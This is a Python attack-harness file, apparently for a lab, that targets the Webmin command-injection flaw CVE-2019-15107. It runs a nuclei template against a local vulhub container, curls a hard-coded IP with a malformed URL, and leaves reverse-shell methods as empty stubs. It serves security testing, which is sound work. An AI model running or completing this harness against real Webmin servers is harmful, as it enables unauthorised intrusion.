from attackerBase import *
from attackConfig import *



class OSCI_CVE_2019_15107_Attacker1(AttackerBase):
    
    def __init__(self):
        self.commandRunner = CommandRunner()
        

        
    def discovery(self) -> None:     
        #self.commandRunner.runCommand("pwd")
        #self.commandRunner.runCommand("cd ..")
        #self.commandRunner.runCommand('ls')
	self.commandRunner.runCommand('curl http://http://144.122.71.18:30002')
	#(https://ivrsuresh.wordpress.com/2019/10/17/web-application-penetration-testing-with-curl/)

    def main(self):
        print("Main method started")
        #self.commandRunner.runCommand('echo "nuclei script started" ')     
        self.commandRunner.runCommand('nuclei -u https://localhost:10000 -t ~/Desktop/TEST_ATTACTKS/ATTACK_YAMLS/CWE-78_OS-Command-Injection/CVE-2019-15107.yaml -debug ')


    # Reverse shell will be handle later...
    def reverseShell(self):

        # init newTerminalThread
        # newTerminalThread -> Open terminal and run specific code ( it will wait) 


        # mainThread
        # Run another command1
        # Run another command2
        # Run another command3
        


        
        pass
    def reverseShell2(self):
        pass

#
def attackInvoker(attackerBase: AttackerBase):
    print("Invoked attack " + attackerBase.__class__.__name__)
    attackerBase.templateMethod()

if __name__ == '__main__':
    
    # Call your custom attacks here
    attackInvoker(OSCI_CVE_2019_15107_Attacker1())




# CWE-78
# CVE-2019-15107
# IP
# PORT
# IMAGE: vulhub/webmin:1.910  https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
# sudo docker run -it -p 10000:10000 -d  vulhub/webmin:1.910

# MAIN YAML PATH: ~/TEST_ATTACTKS/ATTACK_YAMLS/CWE-78_OS-Command-Injection/CVE-2019-15107_Payload.yaml
# MAIN YAML AUTHOR: HALE
# MAIN YAML SOURCE: https://github.com/jas502n/CVE-2019-15107

